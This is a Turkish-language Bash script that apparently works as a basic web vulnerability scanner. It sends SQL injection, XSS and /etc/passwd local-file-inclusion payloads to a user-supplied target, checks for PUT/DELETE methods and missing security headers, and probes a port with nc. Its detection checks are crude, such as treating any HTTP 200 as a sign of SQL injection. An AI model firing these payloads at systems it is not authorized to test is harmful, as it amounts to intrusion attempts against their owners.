#!/bin/bash

read -p "Lütfen taranacak site URL'sini girin (örnek: http://hedefsite.com): " TARGET
read -p "Lütfen taranacak port numarasını girin: " PORT

if [ -z "$TARGET" ] || [ -z "$PORT" ]; then
    echo "Hedef URL ve port numarası gerekli!"
    exit 1
fi

sql_payload="' OR '1'='1"
response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET?param=$sql_payload")

if [ "$response" == "200" ]; then
    echo "[+] SQL Enjeksiyon ihtimali tespit edildi!"
else
    echo "[-] SQL Enjeksiyon tespit edilmedi."
fi

xss_payload="<script>alert('XSS')</script>"
response=$(curl -s "$TARGET" --data "param=$xss_payload")

if [[ "$response" == *"<script>alert('XSS')</script>"* ]]; then
    echo "[+] XSS zafiyeti tespit edildi!"
else
    echo "[-] XSS zafiyeti tespit edilmedi."
fi

methods=$(curl -s -I -X OPTIONS $TARGET | grep "Allow:")

if [[ "$methods" == *"PUT"* || "$methods" == *"DELETE"* ]]; then
    echo "[+] Güvensiz HTTP yöntemleri tespit edildi!"
else
    echo "[-] Güvensiz HTTP yöntemleri tespit edilmedi."
fi

x_frame_options=$(curl -s -I $TARGET | grep -i "X-Frame-Options")

if [ -z "$x_frame_options" ]; then
    echo "[-] X-Frame-Options başlığı eksik. Clickjacking saldırılarına karşı savunmasız olabilir."
else
    echo "[+] X-Frame-Options başlığı mevcut."
fi

x_xss_protection=$(curl -s -I $TARGET | grep -i "X-XSS-Protection")

if [ -z "$x_xss_protection" ]; then
    echo "[-] X-XSS-Protection başlığı eksik. XSS saldırılarına karşı savunmasız olabilir."
else
    echo "[+] X-XSS-Protection başlığı mevcut."
fi

content_security_policy=$(curl -s -I $TARGET | grep -i "Content-Security-Policy")

if [ -z "$content_security_policy" ]; then
    echo "[-] Content-Security-Policy başlığı eksik. Güvenlik politika başlığı eksik."
else
    echo "[+] Content-Security-Policy başlığı mevcut."
fi

lfi_payload="/etc/passwd"
response=$(curl -s "$TARGET?file=$lfi_payload")

if [[ "$response" == *"root:"* ]]; then
    echo "[+] LFI (Local File Inclusion) zafiyeti tespit edildi!"
else
    echo "[-] LFI zafiyeti tespit edilmedi."
fi

nc -zv $TARGET $PORT
if [ $? -eq 0 ]; then
    echo "[+] Port $PORT açık ve erişilebilir."
else
    echo "[-] Port $PORT kapalı veya erişilemez."
fi
